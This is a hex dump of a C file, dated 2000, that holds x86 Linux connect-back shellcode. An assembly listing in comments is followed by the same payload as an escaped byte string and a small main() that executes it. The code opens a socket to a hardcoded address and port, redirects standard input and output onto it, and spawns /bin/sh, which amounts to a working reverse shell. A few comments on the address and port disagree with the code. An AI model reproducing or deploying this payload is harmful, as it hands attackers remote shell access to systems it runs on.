00000000  2f 2a 0d 0a 43 6f 6e 6e  65 63 74 69 6e 67 20 73  |/*..Connecting s|
00000010  68 65 6c 6c 63 6f 64 65  20 77 72 69 74 74 65 6e  |hellcode written|
00000020  20 62 79 20 6c 61 6d 61  67 72 61 20 3c 6c 61 6d  | by lamagra <lam|
00000030  61 67 72 61 40 64 69 67  69 62 65 6c 2e 6f 72 67  |agra@digibel.org|
00000040  3e 0d 0a 68 74 74 70 3a  2f 2f 6c 61 6d 61 67 72  |>..http://lamagr|
00000050  61 2e 73 65 4b 75 72 65  2e 64 65 0d 0a 0d 0a 4d  |a.seKure.de....M|
00000060  61 79 20 32 30 30 30 0d  0a 0d 0a 2e 66 69 6c 65  |ay 2000.....file|
00000070  09 22 63 6f 6e 6e 65 63  74 22 0d 0a 2e 76 65 72  |."connect"...ver|
00000080  73 69 6f 6e 09 22 30 31  2e 30 31 22 0d 0a 2e 74  |sion."01.01"...t|
00000090  65 78 74 0d 0a 09 2e 61  6c 69 67 6e 20 34 0d 0a  |ext....align 4..|
000000a0  5f 73 74 61 72 74 3a 0d  0a 09 23 73 6f 63 6b 65  |_start:...#socke|
000000b0  74 28 41 46 5f 49 4e 45  54 2c 53 4f 43 4b 5f 53  |t(AF_INET,SOCK_S|
000000c0  54 52 45 41 4d 2c 49 50  50 52 4f 54 4f 5f 49 50  |TREAM,IPPROTO_IP|
000000d0  29 3b 0d 0a 09 6d 6f 76  6c 20 25 65 73 70 2c 25  |);...movl %esp,%|
000000e0  65 62 70 0d 0a 09 78 6f  72 6c 20 25 65 64 78 2c  |ebp...xorl %edx,|
000000f0  25 65 64 78 0d 0a 09 6d  6f 76 62 20 24 31 30 32  |%edx...movb $102|
00000100  2c 25 65 64 78 0d 0a 09  6d 6f 76 6c 20 25 65 64  |,%edx...movl %ed|
00000110  78 2c 25 65 61 78 09 09  23 20 31 30 32 20 3d 20  |x,%eax..# 102 = |
00000120  73 6f 63 6b 65 74 63 61  6c 6c 0d 0a 09 78 6f 72  |socketcall...xor|
00000130  6c 20 25 65 63 78 2c 25  65 63 78 0d 0a 09 6d 6f  |l %ecx,%ecx...mo|
00000140  76 6c 20 25 65 63 78 2c  25 65 62 78 0d 0a 09 69  |vl %ecx,%ebx...i|
00000150  6e 63 6c 20 25 65 62 78  09 20 09 09 23 20 73 6f  |ncl %ebx. ..# so|
00000160  63 6b 65 74 28 29 0d 0a  09 6d 6f 76 6c 20 25 65  |cket()...movl %e|
00000170  62 78 2c 20 2d 38 28 25  65 62 70 29 09 23 20 31  |bx, -8(%ebp).# 1|
00000180  20 3d 20 53 4f 43 4b 5f  53 54 52 45 41 4d 0d 0a  | = SOCK_STREAM..|
00000190  09 69 6e 63 6c 20 25 65  62 78 0d 0a 09 6d 6f 76  |.incl %ebx...mov|
000001a0  6c 20 25 65 62 78 2c 20  2d 31 32 28 25 65 62 70  |l %ebx, -12(%ebp|
000001b0  29 09 23 20 32 20 3d 20  41 46 5f 49 4e 45 54 0d  |).# 2 = AF_INET.|
000001c0  0a 09 64 65 63 6c 20 25  65 62 78 09 09 09 23 20  |..decl %ebx...# |
000001d0  31 20 3d 20 53 59 53 5f  73 6f 63 6b 65 74 0d 0a  |1 = SYS_socket..|
000001e0  09 6d 6f 76 6c 20 25 65  63 78 2c 20 2d 34 28 25  |.movl %ecx, -4(%|
000001f0  65 62 70 29 09 23 20 30  20 3d 20 49 50 50 52 4f  |ebp).# 0 = IPPRO|
00000200  54 4f 5f 49 50 20 0d 0a  09 6c 65 61 6c 20 2d 31  |TO_IP ...leal -1|
00000210  32 28 25 65 62 70 29 2c  25 65 63 78 09 23 20 70  |2(%ebp),%ecx.# p|
00000220  75 74 20 61 72 67 73 20  69 6e 20 63 6f 72 72 65  |ut args in corre|
00000230  63 74 20 70 6c 61 63 65  0d 0a 09 69 6e 74 20 20  |ct place...int  |
00000240  24 30 78 38 30 09 09 09  23 20 73 77 69 74 63 68  |$0x80...# switch|
00000250  20 74 6f 20 6b 65 72 6e  65 6c 2d 6d 6f 64 65 0d  | to kernel-mode.|
00000260  0a 09 78 6f 72 6c 20 25  65 63 78 2c 25 65 63 78  |..xorl %ecx,%ecx|
00000270  0d 0a 09 6d 6f 76 6c 20  25 65 61 78 2c 2d 31 32  |...movl %eax,-12|
00000280  28 25 65 62 70 29 09 23  20 73 61 76 65 20 74 68  |(%ebp).# save th|
00000290  65 20 66 64 0d 0a 0d 0a  09 23 20 63 6f 6e 6e 65  |e fd.....# conne|
000002a0  63 74 28 66 64 2c 28 73  74 72 75 63 74 20 73 6f  |ct(fd,(struct so|
000002b0  63 6b 61 64 64 72 20 2a  29 26 73 74 72 75 63 74  |ckaddr *)&struct|
000002c0  2c 31 36 29 3b 0d 0a 09  69 6e 63 6c 20 25 65 62  |,16);...incl %eb|
000002d0  78 0d 0a 09 6d 6f 76 77  20 25 65 62 78 2c 2d 32  |x...movw %ebx,-2|
000002e0  30 28 25 65 62 70 29 09  23 20 32 20 3d 20 50 46  |0(%ebp).# 2 = PF|
000002f0  5f 49 4e 45 54 0d 0a 09  6d 6f 76 77 20 24 39 39  |_INET...movw $99|
00000300  39 39 2c 2d 31 38 28 25  65 62 70 29 09 23 20 39  |99,-18(%ebp).# 9|
00000310  39 39 39 20 3d 20 68 74  6f 6e 73 28 33 38 37 39  |999 = htons(3879|
00000320  29 3b 0d 0a 09 6d 6f 76  6c 20 24 30 78 31 30 30  |);...movl $0x100|
00000330  30 30 37 66 2c 2d 31 36  28 25 65 62 70 29 20 23  |007f,-16(%ebp) #|
00000340  20 68 74 6f 6e 6c 28 49  50 29 20 0d 0a 09 6c 65  | htonl(IP) ...le|
00000350  61 6c 20 2d 32 30 28 25  65 62 70 29 2c 25 65 61  |al -20(%ebp),%ea|
00000360  78 09 23 20 73 74 72 75  63 74 20 73 6f 63 6b 61  |x.# struct socka|
00000370  64 64 72 0d 0a 09 6d 6f  76 6c 20 25 65 61 78 2c  |ddr...movl %eax,|
00000380  2d 38 28 25 65 62 70 29  09 23 20 6c 6f 61 64 20  |-8(%ebp).# load |
00000390  74 68 65 20 73 74 72 75  63 74 0d 0a 09 6d 6f 76  |the struct...mov|
000003a0  62 20 24 31 36 2c 2d 34  28 25 65 62 70 29 09 09  |b $16,-4(%ebp)..|
000003b0  23 20 31 36 20 3d 20 73  69 7a 65 6f 66 28 73 6f  |# 16 = sizeof(so|
000003c0  63 6b 61 64 64 72 29 0d  0a 09 6d 6f 76 6c 20 25  |ckaddr)...movl %|
000003d0  65 64 78 2c 25 65 61 78  09 09 23 20 31 30 32 20  |edx,%eax..# 102 |
000003e0  3d 20 73 6f 63 6b 65 74  63 61 6c 6c 0d 0a 09 69  |= socketcall...i|
000003f0  6e 63 6c 20 25 65 62 78  09 09 09 23 20 33 20 3d  |ncl %ebx...# 3 =|
00000400  20 53 59 53 5f 63 6f 6e  6e 65 63 74 0d 0a 09 6c  | SYS_connect...l|
00000410  65 61 6c 20 2d 31 32 28  25 65 62 70 29 2c 25 65  |eal -12(%ebp),%e|
00000420  63 78 09 23 20 70 75 74  20 61 72 67 73 20 69 6e  |cx.# put args in|
00000430  20 70 6c 61 63 65 0d 0a  09 69 6e 74 20 20 24 30  | place...int  $0|
00000440  78 38 30 09 09 09 23 20  63 61 6c 6c 20 73 6f 63  |x80...# call soc|
00000450  6b 65 74 63 61 6c 6c 28  29 0d 0a 0d 0a 09 23 20  |ketcall().....# |
00000460  64 75 70 32 28 66 64 2c  30 2d 31 2d 32 29 0d 0a  |dup2(fd,0-1-2)..|
00000470  09 78 6f 72 6c 20 25 65  63 78 2c 25 65 63 78 0d  |.xorl %ecx,%ecx.|
00000480  0a 09 6d 6f 76 62 20 24  36 33 2c 25 65 61 78 09  |..movb $63,%eax.|
00000490  09 23 20 36 33 20 3d 20  64 75 70 32 28 29 0d 0a  |.# 63 = dup2()..|
000004a0  09 69 6e 74 20 20 24 30  78 38 30 0d 0a 20 20 20  |.int  $0x80..   |
000004b0  20 20 20 20 20 69 6e 63  6c 20 25 65 63 78 0d 0a  |     incl %ecx..|
000004c0  20 20 20 20 20 20 20 20  63 6d 70 6c 20 24 33 2c  |        cmpl $3,|
000004d0  25 65 63 78 0d 0a 20 20  20 20 20 20 20 20 6a 6e  |%ecx..        jn|
000004e0  65 20 20 2d 30 78 61 0d  0a 0d 0a 09 23 20 61 72  |e  -0xa.....# ar|
000004f0  67 5b 30 5d 20 3d 20 22  2f 62 69 6e 2f 73 68 22  |g[0] = "/bin/sh"|
00000500  0d 0a 09 23 20 61 72 67  5b 31 5d 20 3d 20 30 78  |...# arg[1] = 0x|
00000510  30 0d 0a 09 23 20 65 78  65 63 76 65 28 61 72 67  |0...# execve(arg|
00000520  5b 30 5d 2c 61 72 67 29  3b 0d 0a 09 6a 6d 70 20  |[0],arg);...jmp |
00000530  20 30 78 31 38 0d 0a 09  70 6f 70 6c 20 25 65 73  | 0x18...popl %es|
00000540  69 0d 0a 09 6d 6f 76 6c  20 25 65 73 69 2c 30 78  |i...movl %esi,0x|
00000550  38 28 25 65 62 70 29 0d  0a 09 78 6f 72 6c 20 25  |8(%ebp)...xorl %|
00000560  65 61 78 2c 25 65 61 78  0d 0a 09 6d 6f 76 62 20  |eax,%eax...movb |
00000570  25 65 61 78 2c 30 78 37  28 25 65 73 69 29 0d 0a  |%eax,0x7(%esi)..|
00000580  09 6d 6f 76 6c 20 25 65  61 78 2c 30 78 63 28 25  |.movl %eax,0xc(%|
00000590  65 62 70 29 0d 0a 09 6d  6f 76 62 20 24 30 78 62  |ebp)...movb $0xb|
000005a0  2c 25 61 6c 0d 0a 09 6d  6f 76 6c 20 25 65 73 69  |,%al...movl %esi|
000005b0  2c 25 65 62 78 0d 0a 09  6c 65 61 6c 20 30 78 38  |,%ebx...leal 0x8|
000005c0  28 25 65 62 70 29 2c 25  65 63 78 09 0d 0a 09 6c  |(%ebp),%ecx....l|
000005d0  65 61 6c 20 30 78 63 28  25 65 62 70 29 2c 25 65  |eal 0xc(%ebp),%e|
000005e0  64 78 09 0d 0a 09 69 6e  74 20 20 24 30 78 38 30  |dx....int  $0x80|
000005f0  09 0d 0a 09 63 61 6c 6c  20 2d 30 78 31 64 0d 0a  |....call -0x1d..|
00000600  09 2e 73 74 72 69 6e 67  20 22 2f 62 69 6e 2f 73  |..string "/bin/s|
00000610  68 22 0d 0a 2a 2f 0d 0a  0d 0a 23 64 65 66 69 6e  |h"..*/....#defin|
00000620  65 20 4e 41 4d 45 20 22  63 6f 6e 6e 65 63 74 69  |e NAME "connecti|
00000630  6e 67 22 0d 0a 0d 0a 63  68 61 72 20 63 6f 64 65  |ng"....char code|
00000640  5b 5d 3d 0d 0a 22 5c 78  38 39 5c 78 65 35 5c 78  |[]=.."\x89\xe5\x|
00000650  33 31 5c 78 64 32 5c 78  62 32 5c 78 36 36 5c 78  |31\xd2\xb2\x66\x|
00000660  38 39 5c 78 64 30 5c 78  33 31 5c 78 63 39 5c 78  |89\xd0\x31\xc9\x|
00000670  38 39 5c 78 63 62 5c 78  34 33 5c 78 38 39 5c 78  |89\xcb\x43\x89\x|
00000680  35 64 5c 78 66 38 22 0d  0a 22 5c 78 34 33 5c 78  |5d\xf8".."\x43\x|
00000690  38 39 5c 78 35 64 5c 78  66 34 5c 78 34 62 5c 78  |89\x5d\xf4\x4b\x|
000006a0  38 39 5c 78 34 64 5c 78  66 63 5c 78 38 64 5c 78  |89\x4d\xfc\x8d\x|
000006b0  34 64 5c 78 66 34 5c 78  63 64 5c 78 38 30 5c 78  |4d\xf4\xcd\x80\x|
000006c0  33 31 5c 78 63 39 5c 78  38 39 22 0d 0a 22 5c 78  |31\xc9\x89".."\x|
000006d0  34 35 5c 78 66 34 5c 78  34 33 5c 78 36 36 5c 78  |45\xf4\x43\x66\x|
000006e0  38 39 5c 78 35 64 5c 78  65 63 5c 78 36 36 5c 78  |89\x5d\xec\x66\x|
000006f0  63 37 5c 78 34 35 5c 78  65 65 5c 78 30 66 5c 78  |c7\x45\xee\x0f\x|
00000700  32 37 5c 78 63 37 5c 78  34 35 5c 78 66 30 22 0d  |27\xc7\x45\xf0".|
00000710  0a 22 5c 78 37 66 5c 78  30 31 5c 78 30 31 5c 78  |."\x7f\x01\x01\x|
00000720  30 31 5c 78 38 64 5c 78  34 35 5c 78 65 63 5c 78  |01\x8d\x45\xec\x|
00000730  38 39 5c 78 34 35 5c 78  66 38 5c 78 63 36 5c 78  |89\x45\xf8\xc6\x|
00000740  34 35 5c 78 66 63 5c 78  31 30 5c 78 38 39 5c 78  |45\xfc\x10\x89\x|
00000750  64 30 22 0d 0a 22 5c 78  34 33 5c 78 38 64 5c 78  |d0".."\x43\x8d\x|
00000760  34 64 5c 78 66 34 5c 78  63 64 5c 78 38 30 5c 78  |4d\xf4\xcd\x80\x|
00000770  33 31 5c 78 63 39 5c 78  62 30 5c 78 33 66 5c 78  |31\xc9\xb0\x3f\x|
00000780  63 64 5c 78 38 30 5c 78  34 31 5c 78 38 33 5c 78  |cd\x80\x41\x83\x|
00000790  66 39 5c 78 30 33 22 0d  0a 22 5c 78 37 35 5c 78  |f9\x03".."\x75\x|
000007a0  66 36 5c 78 65 62 5c 78  31 38 5c 78 35 65 5c 78  |f6\xeb\x18\x5e\x|
000007b0  38 39 5c 78 37 35 5c 78  30 38 5c 78 33 31 5c 78  |89\x75\x08\x31\x|
000007c0  63 30 5c 78 38 38 5c 78  34 36 5c 78 30 37 5c 78  |c0\x88\x46\x07\x|
000007d0  38 39 5c 78 34 35 5c 78  30 63 22 0d 0a 22 5c 78  |89\x45\x0c".."\x|
000007e0  62 30 5c 78 30 62 5c 78  38 39 5c 78 66 33 5c 78  |b0\x0b\x89\xf3\x|
000007f0  38 64 5c 78 34 64 5c 78  30 38 5c 78 38 64 5c 78  |8d\x4d\x08\x8d\x|
00000800  35 35 5c 78 30 63 5c 78  63 64 5c 78 38 30 5c 78  |55\x0c\xcd\x80\x|
00000810  65 38 5c 78 65 33 5c 78  66 66 5c 78 66 66 22 0d  |e8\xe3\xff\xff".|
00000820  0a 22 5c 78 66 66 2f 62  69 6e 2f 73 68 22 3b 0d  |."\xff/bin/sh";.|
00000830  0a 0d 0a 0d 0a 6d 61 69  6e 28 29 0d 0a 7b 0d 0a  |.....main()..{..|
00000840  20 20 69 6e 74 20 28 2a  66 75 6e 63 74 29 28 29  |  int (*funct)()|
00000850  3b 0d 0a 20 20 66 75 6e  63 74 20 3d 20 28 69 6e  |;..  funct = (in|
00000860  74 20 28 2a 29 28 29 29  20 63 6f 64 65 3b 0d 0a  |t (*)()) code;..|
00000870  20 20 70 72 69 6e 74 66  28 22 25 73 20 73 68 65  |  printf("%s she|
00000880  6c 6c 63 6f 64 65 5c 6e  5c 74 53 69 7a 65 20 3d  |llcode\n\tSize =|
00000890  20 25 64 5c 6e 22 2c 4e  41 4d 45 2c 73 74 72 6c  | %d\n",NAME,strl|
000008a0  65 6e 28 63 6f 64 65 29  29 3b 0d 0a 20 20 28 69  |en(code));..  (i|
000008b0  6e 74 29 28 2a 66 75 6e  63 74 29 28 29 3b 0d 0a  |nt)(*funct)();..|
000008c0  7d                                                |}|
000008c1
